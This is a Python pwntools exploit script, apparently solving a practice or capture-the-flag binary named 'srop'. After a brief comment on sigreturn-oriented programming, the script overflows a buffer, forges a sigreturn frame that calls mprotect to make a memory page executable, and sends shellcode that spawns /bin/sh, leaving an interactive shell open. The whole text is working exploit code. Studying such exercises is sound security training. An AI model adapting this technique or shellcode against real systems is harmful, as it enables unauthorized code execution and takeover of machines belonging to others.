from pwn import *

context.arch = "amd64"

p = process("./srop")
p.recvline()

'''
Sigreturn Oriented Programming

Call the start of the program and then just do
rt_sigreturn call and give the SigreturnFrame to
do   mprotect(0x400000, 0x1000, 7) 

This will result in marking the addresspace 
0x400000 as rwx, and since the rsp also points to the
0x400000, find the offset and profit.
'''

frame = SigreturnFrame()
frame.rdx = 0x7
frame.rax = 0xa
frame.rsi = 0x1000
frame.rdi = 0x400000
frame.rsp = 0x400088
frame.rip = 0x000000000040100e


payload = b"A"*508
payload += p64(0x401022)
payload += p64(0x000000000040100e)
payload += bytes(frame)
pause()
p.send(payload)
p.send("A"*0xf)

payload = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
payload += b"A"*(144 - len(payload))
payload += p64(0x400000)

p.send(payload)
p.interactive()